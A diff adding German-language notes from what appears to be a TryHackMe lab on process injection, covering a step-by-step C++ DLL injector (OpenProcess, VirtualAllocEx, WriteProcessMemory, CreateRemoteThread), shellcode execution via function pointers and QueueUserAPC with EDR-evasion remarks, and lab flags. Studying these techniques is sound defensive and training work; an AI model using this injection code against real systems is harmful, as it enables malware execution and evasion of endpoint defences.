@@ -465,3 +465,172 @@ Welche Flagge wird nach dem Hijacking des Threads erhalten?
 ```
 THM{w34p0n1z3d_53w1n6}
 ```
+
+# Task 5 - DLLs ausnutzung
+Auf einer höheren Ebene kann DLL-Injektion in sechs Schritte unterteilt werden:
+
+1. Finden Sie einen Zielprozess zur Injektion.
+2. Öffnen Sie den Zielprozess.
+3. Allokieren Sie einen Speicherbereich für die bösartige DLL.
+4. Schreiben Sie die bösartige DLL in den allokierten Speicher.
+5. Laden und führen Sie die bösartige DLL aus.
+
+Wir werden einen einfachen DLL-Injektor aufschlüsseln, um jeden der Schritte zu identifizieren und im Folgenden ausführlicher zu erklären.
+
+Im ersten Schritt der DLL-Injektion müssen wir einen Ziel-Thread finden. Ein Thread kann aus einem Prozess mithilfe einer Kombination von drei Windows-API-Aufrufen gefunden werden: `CreateToolhelp32Snapshot()`, `Process32First()` und `Process32Next()`.
+```C++
+DWORD getProcessId(const char *processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
+			TH32CS_SNAPPROCESS, // Include all processes residing on the system
+			0 // Indicates the current process
+		);
+    if (hSnapshot) {
+        PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
+        entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
+        if (Process32First( // Obtains the first process in the snapshot
+					hSnapshot, // Handle of the snapshot
+					&entry // Pointer to the PROCESSENTRY32 structure
+				)) {
+            do {
+                if (!strcmp( // Compares two strings to determine if the process name matches
+									entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
+									processName // Supplied process name
+								)) { 
+                    return entry.th32ProcessID; // Process ID of matched process
+                }
+            } while (Process32Next( // Obtains the next process in the snapshot
+							hSnapshot, // Handle of the snapshot
+							&entry
+						)); // Pointer to the PROCESSENTRY32 structure
+        }
+    }
+
+DWORD processId = getProcessId(processName); // Stores the enumerated process ID
+```
+
+Im zweiten Schritt, nachdem die PID ermittelt wurde, müssen wir den Prozess öffnen. Dies kann mit einer Vielzahl von Windows-API-Aufrufen erreicht werden: `GetModuleHandle`, `GetProcAddress` oder `OpenProcess`.
+```C++
+HANDLE hProcess = OpenProcess(
+	PROCESS_ALL_ACCESS, // Requests all possible access rights
+	FALSE, // Child processes do not inheret parent process handle
+	processId // Stored process ID
+);
+```
+
+Im dritten Schritt muss Speicher für die bereitgestellte bösartige DLL allokiert werden. Wie bei den meisten Injektoren kann dies mit `VirtualAllocEx` erreicht werden.
+```C++
+LPVOID dllAllocatedMemory = VirtualAllocEx(
+	hProcess, // Handle for the target process
+	NULL, 
+	strlen(dllLibFullPath), // Size of the DLL path
+	MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
+	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
+);
+```
+
+Im vierten Schritt müssen wir die bösartige DLL in den allokierten Speicherbereich schreiben. Dazu können wir `WriteProcessMemory` verwenden, um in die allokierte Region zu schreiben.
+```C++
+WriteProcessMemory(
+	hProcess, // Handle for the target process
+	dllAllocatedMemory, // Allocated memory region
+	dllLibFullPath, // Path to the malicious DLL
+	strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
+	NULL
+);
+```
+
+Im fünften Schritt ist unsere bösartige DLL in den Speicher geschrieben, und alles, was wir tun müssen, ist sie zu laden und auszuführen. Um die DLL zu laden, müssen wir `LoadLibrary` verwenden, importiert aus `kernel32`. Sobald sie geladen ist, kann `CreateRemoteThread` verwendet werden, um den Speicher mithilfe von `LoadLibrary` als Startfunktion auszuführen.
+```C++
+LPVOID loadLibrary = (LPVOID) GetProcAddress(
+	GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
+	"LoadLibraryA" // API call to import
+);
+HANDLE remoteThreadHandler = CreateRemoteThread(
+	hProcess, // Handle for the target process
+	NULL, 
+	0, // Default size from the execuatable of the stack
+	(LPTHREAD_START_ROUTINE) loadLibrary, pointer to the starting function
+	dllAllocatedMemory, // pointer to the allocated memory region
+	0, // Runs immediately after creation
+	NULL
+);
+```
+
+Wir können diese Schritte zusammenstellen, um einen DLL-Injektor zu erstellen. Verwenden Sie den bereitgestellten C++-Injektor und experimentieren Sie mit der DLL-Injektion.
+
+
+## Fragen:
+Identifizieren Sie die PID und den Namen eines Prozesses, der als THM-Attacker läuft und den Sie als Ziel verwenden möchten. Geben Sie den Namen und die bösartige DLL, die sich im Verzeichnis "Injectors" befindet, als Argumente an, um dll-injector.exe auszuführen, das sich ebenfalls im Verzeichnis "Injectors" auf dem Desktop befindet:
+```
+Starte den Task Manager und gehe zu den Reiter Details und suche dort nach einem Prozess, als beispiel nutzte ich den Explorer.exe prozess. syntax dll-injector.exe <NAME OF PROZESS> <MALICIOS DLL>
+```
+
+```
+THM{n07_4_m4l1c10u5_dll}
+```
+
+# Task 6 - Alternativen zur Speicherausführung
+Je nachdem, in welcher Umgebung Sie sich befinden, müssen Sie möglicherweise die Art und Weise ändern, wie Sie Ihren Shellcode ausführen. Dies könnte erforderlich sein, wenn es Hooks auf einem API-Aufruf gibt, die Sie nicht umgehen oder deaktivieren können, ein EDR (Endpoint Detection and Response) Threads überwacht usw.
+
+Bisher haben wir hauptsächlich Methoden betrachtet, um Daten in lokale/remote Prozesse zu allozieren und zu schreiben. Die Ausführung ist ebenfalls ein entscheidender Schritt bei jeder Injektionstechnik, obwohl sie weniger wichtig ist, wenn es darum geht, Artefakte im Speicher und IOCs (Indicators of Compromise) zu minimieren. Im Gegensatz zur Allokation und dem Schreiben von Daten gibt es bei der Ausführung viele verschiedene Optionen zur Auswahl.
+
+In diesem Raum haben wir die Ausführung hauptsächlich durch `CreateThread` und dessen Pendant `CreateRemoteThread` beobachtet.
+
+In dieser Aufgabe werden wir drei weitere Methoden zur Ausführung abdecken, die je nach den Gegebenheiten Ihrer Umgebung verwendet werden können.
+
+### Aufrufen von Funktionszeigern
+Der void-Funktionszeiger ist eine eigenartig neuartige Methode zur Ausführung von Speicherblöcken, die ausschließlich auf Typumwandlung basiert.
+
+Diese Technik kann nur mit lokal alloziertem Speicher ausgeführt werden, jedoch nicht auf API-Aufrufe oder andere Systemfunktionalitäten angewiesen ist.
+
+Die Einzeiler-Version unten ist die gebräuchlichste Form des void-Funktionszeigers, aber wir können sie weiter aufschlüsseln, um ihre Bestandteile zu erklären.
+```C++
+((void(*)())addressPointer)();
+```
+
+Dieser Einzeiler kann schwer zu verstehen oder zu erklären sein, da er so dicht ist. Lassen Sie uns ihn durchgehen, während er den Zeiger verarbeitet.
+
+1. Erstelle einen Funktionszeiger `(void(*)()`, markiert in Rot.
+2. Wandele den allozierten Speicherzeiger oder das Shellcode-Array in den Funktionszeiger um `(<Funktionszeiger> addressPointer)`, markiert in Gelb.
+3. Rufe den Funktionszeiger auf, um den Shellcode auszuführen `();`, markiert in Grün.
+
+Diese Technik hat einen sehr spezifischen Anwendungsfall, kann jedoch sehr ausweichend und hilfreich sein, wenn sie benötigt wird.
+
+### Asynchrone Prozeduraufrufe
+
+Gemäß der [Microsoft-Dokumentation](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) zu asynchronen Prozeduraufrufen (Asynchronous Procedure Calls, APC): "Ein asynchroner Prozeduraufruf (APC) ist eine Funktion, die asynchron im Kontext eines bestimmten Threads ausgeführt wird."
+
+Eine APC-Funktion wird einem Thread über `QueueUserAPC` in die Warteschlange gestellt. Sobald sie in der Warteschlange ist, führt die APC-Funktion zu einem Softwareinterrupt und wird beim nächsten Mal ausgeführt, wenn der Thread geplant wird.
+
+Damit eine Benutzeranwendungs- oder Benutzermodusanwendung eine APC-Funktion in die Warteschlange stellen kann, muss der Thread sich in einem "alarmierbaren Zustand" befinden. Ein alarmierbarer Zustand erfordert, dass der Thread auf einen Rückruf wartet, beispielsweise mittels `WaitForSingleObject` oder `Sleep`.
+
+Nun, da wir verstehen, was APC-Funktionen sind, schauen wir uns an, wie sie böswillig genutzt werden können! Wir werden `VirtualAllocEx` und `WriteProcessMemory` verwenden, um Speicher zu allozieren und zu beschreiben.
+```C++
+QueueUserAPC(
+	(PAPCFUNC)addressPointer, // APC function pointer to allocated memory defined by winnt
+	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
+	(ULONG_PTR)NULL
+	);
+ResumeThread(
+	pinfo.hThread // Handle to thread from PROCESS_INFORMATION structure
+);
+WaitForSingleObject(
+	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
+	INFINITE // Wait infinitely until alerted
+);
+```
+Diese Technik ist eine ausgezeichnete Alternative zur Thread-Ausführung, hat aber in der Erkennungstechnik zunehmend an Bedeutung gewonnen, und spezifische Fallen werden für den Missbrauch von APC implementiert. Je nach den Erkennungsmaßnahmen, mit denen Sie konfrontiert sind, kann dies immer noch eine gute Option sein.
+
+### Abschnittsmanipulation
+
+Eine häufig gesehene Technik in der Malware-Forschung ist die PE (Portable Executable) und Abschnittsmanipulation. Zur Auffrischung: Das PE-Format definiert die Struktur und Formatierung einer ausführbaren Datei unter Windows. Für Ausführungszwecke konzentrieren wir uns hauptsächlich auf die Abschnitte, insbesondere `.data` und `.text`. Tabellen und Zeiger auf Abschnitte werden ebenfalls häufig verwendet, um Daten auszuführen.
+
+Wir werden nicht detailliert auf diese Techniken eingehen, da sie komplex sind und eine umfangreiche technische Aufschlüsselung erfordern, aber wir werden ihre grundlegenden Prinzipien diskutieren.
+
+Für jede Abschnittsmanipulationstechnik benötigen wir zunächst einen PE-Dump. Das Erhalten eines PE-Dumps wird häufig mit einer DLL oder einer anderen bösartigen Datei erreicht, die in `xxd` eingespeist wird.
+
+Im Kern jedes dieser Methoden wird Mathematik verwendet, um durch die physischen Hex-Daten zu navigieren, die in PE-Daten übersetzt werden.
+
+Einige der bekannteren Techniken umfassen das Parsen des RVA-Einstiegspunkts, die Abschnittszuordnung und das Parsen der Relocationstabelle.
+
+Bei allen Injektionstechniken ist die Möglichkeit, gängige Forschungsmethoden zu kombinieren, endlos. Dies bietet Ihnen als Angreifer eine Vielzahl von Optionen, um Ihre bösartigen Daten zu manipulieren und auszuführen.
